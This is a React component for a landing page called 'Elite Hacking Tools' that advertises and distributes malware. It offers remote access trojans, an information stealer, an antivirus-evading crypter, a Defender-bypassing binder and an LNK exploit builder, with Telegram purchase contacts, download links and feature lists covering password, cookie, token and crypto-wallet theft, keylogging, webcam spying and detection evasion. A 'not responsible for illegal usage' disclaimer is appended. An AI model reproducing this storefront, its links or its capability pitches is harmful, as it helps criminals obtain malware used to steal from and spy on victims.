import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Activity, Users } from "lucide-react";
import CookieBanner from "@/components/cookie-banner";
import AdminLoginModal from "@/components/admin-login-modal";

export default function Landing() {
  const [showAdminLogin, setShowAdminLogin] = useState(false);
  const [visitorCount, setVisitorCount] = useState(1337);

  useEffect(() => {
    // Simulate visitor count updates
    const interval = setInterval(() => {
      setVisitorCount(prev => prev + Math.floor(Math.random() * 3));
    }, 5000);

    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen bg-black text-blue-300 overflow-x-hidden font-inter">
      <style jsx global>{`
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap');

        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
          font-family: 'Inter', sans-serif;
        }

        body {
          background: #0a0a0a;
          color: #b3d4fc;
          overflow-x: hidden;
        }

        .container {
          max-width: 1400px;
          margin: 0 auto;
          padding: 30px 20px;
          background: #121212;
          border-radius: 10px;
        }

        header {
          text-align: center;
          padding: 50px 0;
        }

        header h1 {
          font-size: 3em;
          color: #4da8ff;
          letter-spacing: 1px;
          margin-bottom: 10px;
        }

        header p {
          font-size: 1.3em;
          color: #6b7280;
        }

        .intro {
          padding: 30px;
          text-align: center;
          background: #1c2526;
          border-radius: 10px;
          margin: 20px 0;
        }

        .intro p {
          font-size: 1.2em;
          line-height: 1.6;
          color: #b3d4fc;
        }

        .contact-btn, .download-btn, .buy-btn, .unified-btn {
          display: inline-block;
          margin: 15px 10px;
          padding: 10px 25px;
          background: #4da8ff;
          color: #fff;
          text-decoration: none;
          font-size: 1.1em;
          font-weight: 500;
          border-radius: 6px;
          transition: all 0.3s ease;
          min-width: 120px; /* Unified width for buttons */
          text-align: center; /* Ensure text is centered in buttons */
        }

        .contact-btn:hover, .download-btn:hover, .buy-btn:hover, .unified-btn:hover {
          background: #2b6cb0;
          transform: translateY(-1px);
          box-shadow: 0 3px 10px rgba(77, 168, 255, 0.2);
        }

        .tool-section {
          padding: 30px 0;
          background: #1c2526;
          border-radius: 10px;
          margin: 20px 0;
        }

        .tool-section h2 {
          font-size: 2em;
          text-align: center;
          margin-bottom: 15px;
          color: #4da8ff;
        }

        .tool-section p {
          font-size: 1.1em;
          text-align: center;
          color: #9ca3af;
          margin-bottom: 15px;
        }

        .tool-gallery {
          display: flex;
          justify-content: center;
          gap: 15px;
          flex-wrap: wrap;
          margin-bottom: 20px;
        }

        .tool-image {
          position: relative;
          max-width: 400px;
          width: 100%;
          border: 1px solid #2d3748;
          border-radius: 8px;
          transition: all 0.3s ease;
        }

        .tool-image:hover {
          transform: translateY(-3px);
          box-shadow: 0 4px 15px rgba(77, 168, 255, 0.1);
        }

        .tool-image img {
          width: 100%;
          border-radius: 8px;
        }

        .tool-image .caption {
          position: absolute;
          bottom: 8px;
          left: 0;
          right: 0;
          text-align: center;
          background: rgba(0, 0, 0, 0.6);
          color: #b3d4fc;
          padding: 6px;
          font-size: 0.9em;
          border-radius: 0 0 8px 8px;
        }

        .feature-list {
          list-style: none;
          padding: 0 20px;
        }

        .feature-list li {
          font-size: 1em;
          margin: 8px 0;
          position: relative;
          padding-left: 25px;
          color: #b3d4fc;
          transition: color 0.3s ease;
        }

        .feature-list li:hover {
          color: #4da8ff;
        }

        .feature-list li:before {
          content: "✔️";
          position: absolute;
          left: 0;
          color: #4da8ff;
          font-size: 1.1em;
        }

        .disclaimer {
          position: fixed;
          bottom: 0;
          width: 100%;
          background: #121212;
          padding: 12px;
          text-align: center;
          border-top: 1px solid #ef4444;
          font-size: 0.9em;
          color: #ef4444;
        }

        @media (max-width: 768px) {
          header h1 { font-size: 2em; }
          header p { font-size: 1.1em; }
          .intro p { font-size: 1em; }
          .tool-section h2 { font-size: 1.8em; }
          .tool-section p { font-size: 1em; }
          .feature-list li { font-size: 0.9em; }
          .tool-image { max-width: 90%; }
          .container { padding: 20px 10px; }
        }
      `}</style>

      <div className="container">
        <header>
          <h1>Elite Hacking Tools</h1>
          <p>Unleash Your Power with Premium Cyber Weapons</p>
        </header>

        <section className="intro">
          <p>Welcome to the ultimate collection of hacking tools, crafted for the elite. From remote access to stealth data extraction, our tools are designed to dominate any system with precision and style. Each tool is built for performance, stealth, and ease of use. Join the ranks of the best—get yours today.</p>
          <a href="https://t.me/shinyenigma" target="_blank" className="contact-btn">Contact via Telegram: @shinyenigma</a>
          <Button
            variant="outline"
            size="lg"
            className="border-blue-400 text-blue-400 hover:bg-blue-400 hover:text-black px-6 py-3 text-lg font-medium ml-4"
            onClick={() => setShowAdminLogin(true)}
          >
            Admin Portal
          </Button>
          <p>Payments: USDT, BTC, TRX, XMR, ETH, LTC, and more</p>
        </section>

        <section className="tool-section">
          <h2>Millennium RAT v4.0</h2>
          <p>A battle-tested Remote Access Tool with a 2-year legacy, now fully rewritten in C++ for unmatched performance. Control via Telegram with no server or port forwarding needed. Steal data, log keys, and own systems effortlessly.</p>
          <div className="tool-gallery">
            <div className="tool-image">
              <img src="https://i.ibb.co/PZSZ98XD/8g4be4sa.png" alt="Millennium RAT Builder" />
              <div className="caption">Millennium RAT - Control Panel</div>
            </div>
          </div>
          <a href="https://t.me/shinyenigma" target="_blank" className="buy-btn">Buy Now</a>
          <ul className="feature-list">
            <li>Fully rewritten in C++ for speed and stealth</li>
            <li>Small native executable, zero dependencies</li>
            <li>No Microsoft Visual C++ required</li>
            <li>Works on Windows 7+ (32/64-bit)</li>
            <li>Auto StartUp for persistent access</li>
            <li>Anti double-launch protection</li>
            <li>AutoStealer for effortless data theft</li>
            <li>Keylogger for capturing every keystroke</li>
            <li>Anti-VM and Anti-Debug for ultimate evasion</li>
            <li>Compact, user-friendly builder</li>
            <li>Self-installing or non-installing options</li>
            <li>Auto command execution on first run</li>
            <li>Adjustable startup/request delay</li>
            <li>Remote PowerShell/CMD execution</li>
            <li>System info grabbing (CPU, GPU, RAM, location, IP, MAC)</li>
            <li>Discord token theft (client and browsers)</li>
            <li>Telegram data extraction</li>
            <li>Browser data theft (downloads, cookies, passwords, credit cards, history)</li>
            <li>Crypto wallet recovery</li>
            <li>Webcamera capture for surveillance</li>
            <li>Privilege elevation for deeper control</li>
            <li>Messageboxes, wallpaper changes, display rotation</li>
            <li>One-command desktop file grabbing</li>
            <li>File encryption/decryption</li>
            <li>Window minimize/maximize control</li>
            <li>Get active window title, battery info, software list</li>
            <li>User logoff, PC hibernation, BSOD trigger</li>
            <li>SendKeyPress for remote input</li>
            <li>CMD command execution</li>
            <li>Self-uninstall capability</li>
            <li>File/Folder ops (copy, delete, download, upload, list)</li>
            <li>System shutdown, restart, logoff</li>
            <li>Process manager (run, list, kill, get path)</li>
            <li>Bot gifting and much more</li>
          </ul>
        </section>

        <section className="tool-section">
          <h2>DotStealer</h2>
          <p>A multifunctional Windows stealer that sends logs via Telegram bot—no dedicated server needed. Lifetime license for only $30 (updates included). Stay updated via my Telegram channel.</p>
          <div className="tool-gallery">
            <div className="tool-image">
              <img src="https://i.ibb.co/mCnkNsTt/432992187-f48c474b-1e68-4f7d-ba6e-14ad01afdcf4.png" alt="DotStealer Builder" />
              <div className="caption">DotStealer - Configuration Panel</div>
            </div>
          </div>
          <a href="https://t.me/shinyenigma" target="_blank" className="buy-btn">Buy Now</a>
          <ul className="feature-list">
            <li>NEW: Significantly decreased file size</li>
            <li>NEW: Grabs complete list of installed software</li>
            <li>Easy-to-use compact builder</li>
            <li>Client works on Windows 7+ (32/64-bit)</li>
            <li>Anti double-launch protection</li>
            <li>Anti-VM and Anti-Debug for evasion</li>
            <li>Single .NET exe, no dependencies</li>
            <li>Two types of data encryption</li>
            <li>Grabs desktop files</li>
            <li>Run from start directory or install</li>
            <li>Browser data stealing (cookies, downloads, passwords, etc.)</li>
            <li>App-Bound cookie protection bypass (no admin privileges)</li>
            <li>Discord token grabbing</li>
            <li>Telegram session grabbing</li>
            <li>Desktop screenshot capture</li>
            <li>Metamask and Exodus data stealing</li>
            <li>System info stealing (IP, location, username, RAM, GPU, HWID, etc.)</li>
          </ul>
        </section>

        <section className="tool-section">
          <h2>Vedani-Crypter</h2>
          <p>A renowned private Runtime & Scantime crypter with an updating stub and lifetime license—available for free. Protect your EXE files from antivirus scans with this powerful tool, complete with a video tutorial.</p>
          <div className="tool-gallery">
            <div className="tool-image">
              <img src="https://i.ibb.co/BK3SgSQX/56c2nd8g.png" alt="Vedani-Crypter Interface" />
              <div className="caption">Vedani-Crypter - Main Interface</div>
            </div>
          </div>
          <a href="https://github.com/ardentus/Vedani-Crypter.git" target="_blank" className="download-btn">Download Vedani-Crypter</a>
          <ul className="feature-list">
            <li>Runtime & Scantime crypter for EXE protection</li>
            <li>Updating stub for continuous effectiveness</li>
            <li>Lifetime license, free to use</li>
            <li>Includes a video tutorial for setup</li>
          </ul>
        </section>

        <section className="tool-section">
          <h2>VBS Binder</h2>
          <p>A cutting-edge VBS binder generator that runs non-crypted builds without detection by Windows Defender. Adds Defender exclusions, downloads, and executes files while avoiding SmartScreen alerts.</p>
          <div className="tool-gallery">
            <div className="tool-image">
              <img src="https://i.ibb.co/HDTpGjZ4/433060068-33a9d53e-05eb-46f0-8870-826cf9e0643d.png" alt="VBS Binder Interface" />
              <div className="caption">VBS Binder - Generator Interface</div>
            </div>
          </div>
          <a href="https://t.me/shinyenigma" target="_blank" className="buy-btn">Buy Now</a>
          <ul className="feature-list">
            <li>Random obfuscation for every generated file</li>
            <li>No SmartScreen alerts for binder or downloaded files</li>
            <li>No Windows Defender alerts</li>
            <li>Bind multiple files with ease</li>
            <li>Optional fake error for deception</li>
          </ul>
        </section>

        <section className="tool-section">
          <h2>LNK Exploit Builder</h2>
          <p>An advanced exploit that generates a fake .txt file with a backdoor to execute EXE/BAT files silently. Designed for Windows 7 and higher, perfect for stealth operations.</p>
          <div className="tool-gallery">
            <div className="tool-image">
              <img src="https://i.ibb.co/8LC2Rsr6/426710183-82256fed-fe27-481b-ac6a-d0fbf9701882.png" alt="LNK Exploit Builder Interface" />
              <div className="caption">LNK Exploit Builder - Main Interface</div>
            </div>
          </div>
          <a href="https://github.com/shinyelectron/LNK-Exploit.git" target="_blank" className="download-btn">Download LNK Exploit Builder</a>
          <ul className="feature-list">
            <li>NEW: Additional link encoding and obfuscation</li>
            <li>Easy-to-use builder</li>
            <li>Fake description generator</li>
            <li>Hides backdoor code deep inside the binary</li>
            <li>Txt downloading option for long text files</li>
            <li>Silent PowerShell console in the background</li>
            <li>Anti-analyzing: Property changes disable malicious code</li>
            <li>Bypasses Windows SmartScreen alerts</li>
            <li>Not blocked or deleted by Windows Defender</li>
          </ul>
        </section>

        <section className="tool-section">
          <h2>888 RAT (Windows/Android/Linux)</h2>
          <p>An advanced hidden remote access tool, available for free, with modes for Android, Windows, and Linux. Dominate across platforms with this versatile RAT. Archive password: 888.</p>
          <div className="tool-gallery">
            <div className="tool-image">
              <img src="https://i.ibb.co/9JMcNGy/426647492-039db33a-8d20-4607-8991-52c4dcbdd9fa.png" alt="888 RAT Interface" />
              <div className="caption">888 RAT - Settings</div>
            </div>
          </div>
          <a href="https://mega.nz/file/d6V1kB5C#snmOatmYcYDz4I7T4coGEElM7kyhU9prWE873FI8wz8" target="_blank" className="unified-btn">Download 888 RAT</a>
          <ul className="feature-list">
            <li>Anti-Analysis for stealth operation</li>
            <li>Icon Changer for customization</li>
            <li>Startup Sleep for delayed execution</li>
            <li>Fake error for deception</li>
            <li>VBS exploit integration</li>
            <li>Supports Windows, Android, and Linux</li>
            <li>File system access</li>
            <li>Spy features: desktop, webcam, system sound</li>
            <li>Stealer: passwords, cookies, FileZilla, etc.</li>
            <li>CMD, regedit, get installed software</li>
            <li>Network scanner, hidden RDP, DNS Spoof</li>
            <li>PC info, GeoIP, Internet Speed Test, Open URL</li>
            <li>Kill/Uninstall functionality</li>
            <li>And much more</li>
          </ul>
        </section>

        <footer style={{
          marginTop: '50px',
          padding: '40px 20px',
          borderTop: '2px solid #2d3748',
          backgroundColor: '#1a1a1a',
          borderRadius: '10px'
        }}>
          <div style={{
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'flex-start',
            flexWrap: 'wrap',
            gap: '20px',
            marginBottom: '30px'
          }}>
            <div style={{ flex: 1, minWidth: '300px' }}>
              <h3 style={{ color: '#4da8ff', marginBottom: '15px' }}>Elite Hacking Tools</h3>
              <p style={{ color: '#9ca3af', fontSize: '0.9em', lineHeight: '1.5', marginBottom: '15px' }}>
                Professional cybersecurity tools for advanced users. All software is provided as-is for educational and authorized testing purposes only.
              </p>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: '15px', marginBottom: '15px' }}>
                <a href="#" style={{ color: '#4da8ff', textDecoration: 'none', fontSize: '0.85em' }}>Terms of Service</a>
                <a href="#" style={{ color: '#4da8ff', textDecoration: 'none', fontSize: '0.85em' }}>Privacy Policy</a>
                <a href="#" style={{ color: '#4da8ff', textDecoration: 'none', fontSize: '0.85em' }}>License Agreement</a>
                <a href="#" style={{ color: '#4da8ff', textDecoration: 'none', fontSize: '0.85em' }}>Support</a>
              </div>
              <div style={{ fontSize: '0.8em', color: '#6b7280' }}>
                <p>🌐 Visitors Online: {visitorCount}</p>
                <p>📡 Server Status: <span style={{ color: '#4ade80' }}>Online</span></p>
                <p>🔒 SSL Secured | 🛡️ DDoS Protected</p>
              </div>
            </div>
            
            <div style={{
              display: 'flex',
              flexDirection: 'column',
              alignItems: 'center',
              gap: '15px'
            }}>
              <div style={{ textAlign: 'center', marginBottom: '10px' }}>
                <h4 style={{ color: '#4da8ff', fontSize: '0.9em', marginBottom: '5px' }}>System Administration</h4>
                <p style={{ color: '#6b7280', fontSize: '0.75em' }}>Authorized Access Only</p>
              </div>
              <button
                onClick={() => setShowAdminLogin(true)}
                style={{
                  background: 'linear-gradient(135deg, #1a1a1a, #2d3748)',
                  border: '2px solid #4da8ff',
                  borderRadius: '50%',
                  width: '70px',
                  height: '70px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  cursor: 'pointer',
                  transition: 'all 0.3s ease',
                  fontSize: '1.8em',
                  boxShadow: '0 2px 10px rgba(0,0,0,0.3)'
                }}
                onMouseOver={(e) => {
                  e.currentTarget.style.transform = 'scale(1.1)';
                  e.currentTarget.style.boxShadow = '0 5px 20px rgba(77, 168, 255, 0.4)';
                  e.currentTarget.style.borderColor = '#2563eb';
                }}
                onMouseOut={(e) => {
                  e.currentTarget.style.transform = 'scale(1)';
                  e.currentTarget.style.boxShadow = '0 2px 10px rgba(0,0,0,0.3)';
                  e.currentTarget.style.borderColor = '#4da8ff';
                }}
              >
                🛡️
              </button>
              <span style={{ color: '#9ca3af', fontSize: '0.75em', textAlign: 'center', maxWidth: '120px' }}>
                Click to access secure control panel
              </span>
            </div>
          </div>
          
          <div style={{
            paddingTop: '20px',
            borderTop: '1px solid #2d3748',
            textAlign: 'center'
          }}>
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              alignItems: 'center',
              gap: '20px',
              flexWrap: 'wrap',
              marginBottom: '15px'
            }}>
              <span style={{ color: '#6b7280', fontSize: '0.8em' }}>🔐 End-to-End Encrypted</span>
              <span style={{ color: '#6b7280', fontSize: '0.8em' }}>⚡ 99.9% Uptime</span>
              <span style={{ color: '#6b7280', fontSize: '0.8em' }}>🌍 Global CDN</span>
            </div>
            <p style={{ color: '#6b7280', fontSize: '0.8em' }}>
              © 2024 Elite Hacking Tools. All rights reserved. | Professional cybersecurity solutions for authorized testing.
            </p>
          </div>
        </footer>
      </div>

      <div className="disclaimer">
        ⚠️ DISCLAIMER: I AM NOT RESPONSIBLE FOR ANY ILLEGAL USAGE OF THESE TOOLS ⚠️
      </div>

      <CookieBanner />
      <AdminLoginModal 
        isOpen={showAdminLogin} 
        onClose={() => setShowAdminLogin(false)} 
      />
    </div>
  );
}